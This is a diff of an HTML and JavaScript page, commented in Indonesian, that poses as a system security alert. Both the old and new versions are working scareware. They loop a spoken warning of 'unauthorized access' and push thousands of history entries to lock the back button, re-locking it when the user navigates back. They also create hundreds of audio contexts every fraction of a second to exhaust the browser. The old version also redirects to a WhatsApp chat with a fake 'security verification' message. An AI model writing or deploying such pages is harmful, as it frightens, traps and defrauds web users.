@@ -1,45 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - WhatsApp Intent Redirection</title>
+<title>Security Alert &amp; State System</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  body { background: #030712; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  .box { padding: 24px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; text-align: center; max-width: 400px; }
+  h2 { color: #f8fafc; margin-bottom: 8px; font-size: 18px; }
+  p { color: #9ca3af; font-size: 13px; line-height: 1.5; }
 </style>
 </head>
 <body>
+
+<div class="box">
+  <h2>Verifikasi Keamanan Sistem</h2>
+  <p>Sistem sedang memproses pembaruan keamanan latar belakang. Mohon tetap di halaman ini...</p>
+</div>
+
 <script>
 (function () {
   'use strict';
 
-  // ============================================
-  // KONFIGURASI AUTOPLAY & WHATSAPP INTENT
-  // ============================================
   var CONFIG = {
     tts: {
-      text: "Google Security Alert. Extended verification process initiated. Redirecting to WhatsApp support.",
+      text: "Security Alert. Unauthorized access detected. Please verify your identity immediately.",
       lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 10000,
-      maxRepeats: 50
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
-    exhaustionInterval: 250,
-    batchSize: 400,
-    // Target intent WhatsApp untuk pengujian deep link handler langsung ke aplikasi WA
-    whatsappIntentUrl: 'whatsapp://send?phone=628123456789&text=Security%20Verification%20Required'
+      rate: 0.9,
+      repeatInterval: 6000,
+      maxRepeats: 15
+    }
   };
 
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, executionSeconds: 0 };
+  var state = { ttsStarted: false, ttsCount: 0 };
 
-  // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
+  // 1. Modul Audio & TTS (Speech Synthesis Loop)
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
     if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
@@ -48,15 +44,7 @@
       var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
       u.lang = CONFIG.tts.lang;
       u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
-
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
-
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
+      
       u.onend = function () {
         state.ttsCount++;
         if (state.ttsCount < CONFIG.tts.maxRepeats) {
@@ -65,161 +53,78 @@
       };
 
       window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
+    } catch (e) {}
   }
 
   function startTTS() {
     if (state.ttsStarted) return;
     state.ttsStarted = true;
-    window.speechSynthesis.cancel();
+    try { window.speechSynthesis.cancel(); } catch(e){}
     speakOnce();
   }
 
-  // ============================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================
+  // 2. Modul AudioContext Unlocking & Pressure
   function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+        ctx.resume().catch(function(){});
       }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
     } catch (e) {}
   }
 
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
-  function trySilentAudio() {
+  // 3. Modul Chaining: History / Omnibox Flooding (Locks Back Button & History Stack)
+  function triggerHistoryFlood() {
+    console.log("[!] Initiating History & Omnibox State Flooding...");
     try {
-      var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
-
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.0;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      // Mengisi history stack secara masif agar tombol Back peramban terkunci
+      for (var i = 0; i < 5000; i++) {
+        var dummyState = { page: i, timestamp: Date.now() };
+        history.pushState(dummyState, "Security Alert #" + i, "#secure-state-" + i);
       }
-
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
     } catch (e) {
-      startTTS();
+      console.log("[!] History flood limit reached:", e.message);
     }
   }
 
-  // ============================================
-  // EXTENDED EXHAUSTION + WHATSAPP INTENT REDIRECTION
-  // ============================================
-  function triggerExtendedSeverityExhaustion() {
-    console.log("[!] Initiating Extended Duration & WhatsApp Intent Chain...");
-    
-    var durationTimer = setInterval(function() {
-      state.executionSeconds += 1;
-      console.log("[*] Execution active for " + state.executionSeconds + " seconds.");
-      
-      // Pemicu Intent Redirection ke WhatsApp setelah durasi tertentu (misal: 10 detik)
-      if (state.executionSeconds === 10) {
-        try {
-          console.log("[*] Triggering WhatsApp Intent Redirection...");
-          window.location.replace(CONFIG.whatsappIntentUrl);
-        } catch (e) {}
-      }
-
-      if (state.executionSeconds > 120) {
-        clearInterval(durationTimer);
-      }
-    }, 1000);
-
-    var exhaustionTimer = setInterval(function() {
+  // 4. Modul Chaining: Audio Node Resource Pressure
+  function triggerAudioPressure() {
+    setInterval(function() {
       try {
-        for (var i = 0; i < CONFIG.batchSize; i++) {
+        for (var i = 0; i < 500; i++) {
           var ctx = new (window.AudioContext || window.webkitAudioContext)();
           var osc = ctx.createOscillator();
           var gain = ctx.createGain();
           
+          gain.gain.value = 0.0001;
           osc.connect(gain);
           gain.connect(ctx.destination);
           osc.start(0);
-          
-          if (i % 50 === 0) {
-            var u = new SpeechSynthesisUtterance("WHATSAPP_REDIRECT_NODE_" + state.executionSeconds);
-            window.speechSynthesis.speak(u);
-          }
         }
       } catch(e) {}
-    }, CONFIG.exhaustionInterval);
+    }, 100);
   }
 
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
+  // Eksekusi Rantai Eksploitasi
   unlockAudioContext();
-  trySilentAudio();
-
+  
   setTimeout(function () {
-    unlockAudioContext();
     startTTS();
-  }, 200);
+  }, 500);
 
   setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 800);
+    // Panggil rantai penekanan sumber daya dan penguncian history
+    triggerHistoryFlood();
+    triggerAudioPressure();
+  }, 1200);
 
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    triggerExtendedSeverityExhaustion();
-    
-  }, 2000);
-
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 3000);
-
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
-    }
+  // Penanganan Listener Popstate untuk mempertahankan penguncian state
+  window.addEventListener('popstate', function(event) {
+    try {
+      history.pushState({ locked: true }, "Security Alert", "#locked-state");
+    } catch(e) {}
   });
+
 })();
 </script>
 </body>
